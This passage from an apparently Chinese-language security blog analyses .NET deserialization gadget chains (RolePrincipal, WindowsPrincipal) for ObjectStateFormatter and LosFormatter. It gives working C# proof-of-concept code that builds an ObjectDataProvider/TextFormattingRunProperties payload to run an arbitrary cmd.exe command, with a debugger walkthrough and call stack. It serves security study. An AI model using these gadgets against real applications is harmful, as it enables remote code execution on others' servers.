Convert.ToBase64String(m.ToArray());</span><br><span class="line">            &#125;</span><br><span class="line">            RolePrincipalMarshal rolePrincipalMarshal = <span class="keyword">new</span> RolePrincipalMarshal(b64payload);</span><br><span class="line">            ObjectStateFormatter objectStateFormatter = <span class="keyword">new</span> ObjectStateFormatter();</span><br><span class="line">            <span class="built_in">string</span> p = objectStateFormatter.Serialize(rolePrincipalMarshal);</span><br><span class="line">            objectStateFormatter.Deserialize(p);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RolePrincipalMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">RolePrincipalMarshal</span>(<span class="params"><span class="built_in">string</span> b64payload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            B64Payload = b64payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> B64Payload &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Web.Security.RolePrincipal));</span><br><span class="line">            info.AddValue(<span class="string">&quot;System.Security.ClaimsPrincipal.Identities&quot;</span>, B64Payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line">            _xaml = XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>先去看这个RolePrincipal的反序列化构造函数</p><p><img src="../images/image-20240306152938875.png" alt="image-20240306152938875"></p><p>其用的是其父类ClaimsPrincipal的反序列化构造函数  我们跟进</p><p><img src="../images/image-20240306153053874.png" alt="image-20240306153053874"></p><p>接着跟进这个Deserialize函数中</p><p><img src="../images/image-20240306153126203.png" alt="image-20240306153126203"></p><p>发现其需要的是ClaimsPrincipal类中的Identities参数   先不知道这个参数是干啥的  我们接着跟进这个DeserializeIdentities函数中去</p><p><img src="../images/image-20240306153248282.png" alt="image-20240306153248282"></p><p>发现其会先base64解码我们传入的值  然后进行反序列化操作  </p><p>那么我们的目标就清晰了  只需将payload的base64编码在序列化的时候传入到System.Security.ClaimsPrincipal.Identities中就行了</p><h2 id="WindowsPrincipal"><a href="#WindowsPrincipal" class="headerlink" title="WindowsPrincipal"></a>WindowsPrincipal</h2><p>demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">using Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Specialized;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Security.Claims;</span><br><span class="line">using System.Security.Principal;    </span><br><span class="line">using System.Web.UI;</span><br><span class="line">using System.Windows.Data;</span><br><span class="line">using System.Windows.Markup;</span><br><span class="line"></span><br><span class="line">namespace ObjectStateFormatterSerialize</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            // WindowsIdentity currentWI = WindowsIdentity.GetCurrent();</span><br><span class="line">            // currentWI.Actor = new ClaimsIdentity();</span><br><span class="line">            // currentWI.Actor.BootstrapContext = new TextFormattingRunPropertiesMarshal(&quot;calc&quot;);</span><br><span class="line">            // WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();</span><br><span class="line">            // obj.wi = currentWI;</span><br><span class="line">            // string v = new ObjectStateFormatter().Serialize(obj);</span><br><span class="line">            // new ObjectStateFormatter().Deserialize(v);</span><br><span class="line">            WindowsIdentity currentWI = WindowsIdentity.GetCurrent();</span><br><span class="line">            currentWI.BootstrapContext= new TextFormattingRunPropertiesMarshal(&quot;calc&quot;);</span><br><span class="line">            WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();</span><br><span class="line">            obj.wi = currentWI;</span><br><span class="line">            string v = new ObjectStateFormatter().Serialize(obj);</span><br><span class="line">            new ObjectStateFormatter().Deserialize(v);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [Serializable]</span><br><span class="line">    public class WindowsPrincipalMarshal : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        public WindowsPrincipalMarshal() &#123; &#125;</span><br><span class="line">        public WindowsIdentity wi &#123; get; set; &#125;</span><br><span class="line">        public void GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(typeof(WindowsPrincipal));</span><br><span class="line">            info.AddValue(&quot;m_identity&quot;, wi);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [Serializable]</span><br><span class="line">    public class TextFormattingRunPropertiesMarshal : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        string _xaml;</span><br><span class="line">        public void GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = typeof(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(&quot;ForegroundBrush&quot;, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        public TextFormattingRunPropertiesMarshal(string cmd)</span><br><span class="line">        &#123;</span><br><span class="line">            // ObjectDataProvider</span><br><span class="line">            ProcessStartInfo psi = new ProcessStartInfo();</span><br><span class="line">            psi.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">            psi.Arguments = $&quot;/c &#123;cmd&#125;&quot;;</span><br><span class="line">            StringDictionary dict = new StringDictionary();</span><br><span class="line">            psi.GetType().GetField(&quot;environmentVariables&quot;, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = new Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = new ObjectDataProvider();</span><br><span class="line">            odp.MethodName = &quot;Start&quot;;</span><br><span class="line">            odp.IsInitialLoadEnabled = false;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line">            _xaml = XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Gadgets-1"><a href="#Gadgets-1" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>其实这里用的原理就是ClaimsIdentity链子的原理 </p><p>LosFormatter底层ObjectStatesFormatter会调用binaryformatter序列化和反序列化自身object字段</p><p><img src="../images/image-20240306171041228.png" alt="image-20240306171041228"></p><p><img src="../images/image-20240306171108616.png" alt="image-20240306171108616"></p><p>这里反序列化的时候  就会反序列化WindowsIdentity类  那么我们进入到这个类的反序列化构造函数中去</p><p><img src="../images/image-20240306171236950.png" alt="image-20240306171236950"></p><p>发现其调用了其父类ClaimsIdentity的反序列化构造方法  我们接着跟进</p><p><img src="../images/image-20240306171249757.png" alt="image-20240306171249757"></p><p><img src="../images/image-20240306171305016.png" alt="image-20240306171305016"></p><p>又因为我们之前给了bootstrapContext赋值 那么这里的话就会对我们传入的字符串进行base64解码  然后再进行反序列化操作</p><p>这样就结束了</p><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ClaimsIdentity.Deserialize()</span><br><span class="line">new ClaimsIdentity()</span><br><span class="line">new WindowsIdentity()</span><br><span class="line">new WindowsIdentity()</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.DeserializeValue()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>06  07基本都是多加一个类少加一个类的关系   本质上差不多</p><p>除了关注反序列化方法传入的参数值，还需要注意使用LosFormatter和ObjectStatesFormatter可能会造成二次反序列化，要关注object类型的字段。</p><p>这两个反序列化的东西  都会反序列化其类里的object参数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
</feed>
